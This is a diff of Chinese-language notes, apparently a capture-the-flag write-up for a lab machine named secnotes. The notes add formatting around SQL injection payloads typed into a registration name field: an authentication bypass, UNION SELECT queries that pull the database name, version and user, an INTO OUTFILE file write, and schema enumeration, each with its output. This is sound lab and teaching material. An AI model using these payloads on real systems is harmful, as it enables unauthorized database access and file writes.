@@ -79,20 +79,35 @@ Nmap done: 1 IP address (1 host up) scanned in 63.25 seconds
 
 ```
 
+# 80
 
+注册时的名字存在sql注入
 
+注入格式
+```
 admin' or 1=1 #
+```
 
+回显字段:2,3,4都会回显
+```
 admin ' union select 1,2,3,4# 
 2, 3 ,4
+```
 
+数据库名字和版本
+```
 admin ' union select 1,database(),3,version()#  
 secnotes, 3 ,8.0.11
+```
 
+当前用户
+```
 admin ' union select 1,system_user(), 3 ,user()# 
 secnotes@localhost,3,secnotes@localhost
+```
 
-admin' union select 1,2,3,'test' into OUTFILE ''#
+
+admin' union select 1,2,3,'test' into OUTFILE './test.txt'#
 
 
 admin' union select 1,2,3,group_concat(distinct table_schema) from information_schema.tables#
